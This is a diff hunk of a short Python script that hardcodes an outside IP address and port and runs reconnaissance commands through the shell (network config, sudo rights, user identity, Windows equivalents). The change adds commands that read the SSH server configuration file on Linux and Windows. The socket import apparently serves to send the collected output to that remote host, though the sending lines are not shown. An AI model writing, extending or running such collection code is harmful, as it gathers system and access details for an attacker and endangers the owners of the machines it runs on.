@@ -1,6 +1,6 @@
 import socket, platform, subprocess
 
-ip, port, cmd = "135.235.193.119", 36452, "ip a;sudo -l; whoami" if platform.system() == "Linux" else "ipconfig && whoami /all"
+ip, port, cmd = "135.235.193.119", 36452, "ip a;sudo -l; whoami; cat /etc/ssh/sshd_config" if platform.system() == "Linux" else "ipconfig && whoami /all && type C:\\ProgramData\\ssh\\sshd_config"
 
 try:net = subprocess.check_output(cmd, shell=True).decode(errors="ignore")
 except: net = "cmd failed"
